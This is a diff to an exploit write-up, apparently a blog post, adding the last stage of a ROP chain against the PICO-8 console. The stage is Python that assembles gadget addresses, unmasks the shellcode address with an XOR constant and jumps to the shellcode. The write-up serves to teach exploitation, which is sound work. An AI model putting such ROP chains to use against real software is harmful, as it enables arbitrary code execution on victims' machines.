@@ -112,7 +112,28 @@ address for `lpflOldProtect` into `EBX`. So we unmask these values with `0x39fff
 We don't need the output value `lpflOldProtect`, so I just set this to point to a location right before our
 comment string in memory. Really, this could be a pointer to any writable memory address.
 
+Lastly, we have some padding to account for `mark_section_writable()` cleaning up its stack, and then we're on to the final stage of the exploit.
+
 ## Stage 3: Jump to our shellcode
+This stage simply loads the address of our shellcode into `EAX` and jumps to it:
+```
+### &shellcode -> eax
+# pop eax ; ret
+rop += b'\x73\x0f\xa1\x6c'
+rop += b'BBBB'
+# xor eax, 0x39ffffff ; ret
+rop += b'\xc7\x45\x96\x6c'
+
+### jump to shellcode!
+# jmp eax
+rop += b'\x7a\x71\x94\x6c'
+
+sc_addr = (0x00559101 + len(rop)) ^ 0x39ffffff
+sc_addr_b = sc_addr.to_bytes(4, byteorder='little')
+rop = rop.replace(b'BBBB', sc_addr_b)
+```
+We dynamically calculate the offset of the shellcode based on the length of the stage 2 ROP chain, as our shellcode is placed immediately after the ROP
+chain in the comment string. The address of our shellcode is loaded into `EAX` and unmasked. We then jump to the shellcode and we have pwned the PICO-8.
 
 ## Conclusion
 TODO
